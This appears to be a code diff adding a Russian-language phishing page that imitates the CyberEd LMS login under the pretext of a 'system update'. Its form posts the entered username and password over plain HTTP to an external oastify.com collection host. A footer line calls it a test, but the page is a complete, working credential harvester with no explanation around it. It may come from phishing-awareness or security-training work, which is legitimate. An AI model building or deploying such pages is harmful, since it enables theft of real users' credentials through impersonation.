@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Вход в LMS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        .login-container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 8px;
+            margin-bottom: 16px;
+            display: inline-block;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #3498db;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 100px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">
+        <!-- Лого можно подгрузить из оригинала или использовать своё -->
+        <img src="https://learn.cyber-ed.ru/theme/space/pix/logo.png"  alt="CyberEd Logo">
+    </div>
+    <h2 style="text-align:center;">Обновление системы LMS</h2>
+    <form action="http://5rxvuo0mi5pfh1ddn3a8o7wrqiw9k08p.oastify.com" method="POST">
+        <label for="username"><b>Логин или email</b></label><br>
+        <input type="text" placeholder="Введите ваш логин" name="username" required><br>
+
+        <label for="password"><b>Пароль</b></label><br>
+        <input type="password" placeholder="Введите пароль" name="password" required><br>
+
+        <button type="submit">Войти</button>
+    </form>
+    <small style="color: gray; text-align: center;">Для тестирования, если ошибка — напишите нам: support@cyber-ed.ru</small>
+</div>
+
+</body>
+</html>
